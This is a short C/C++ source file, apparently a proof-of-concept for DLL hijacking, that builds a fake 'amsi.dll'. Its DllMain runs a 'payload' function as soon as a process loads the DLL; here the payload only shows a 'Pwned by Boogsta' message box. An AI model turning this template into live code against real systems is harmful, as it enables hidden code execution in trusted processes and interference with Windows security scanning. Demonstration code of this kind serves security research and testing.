// amsi.dll
#include "pch.h"
#include <Windows.h>
#include <stdio.h>

VOID payload() { 
    MessageBoxA(NULL, "Pwned by Boogsta", "PoC", MB_OK | MB_ICONINFORMATION);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {
        payload();
        break;
    };
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
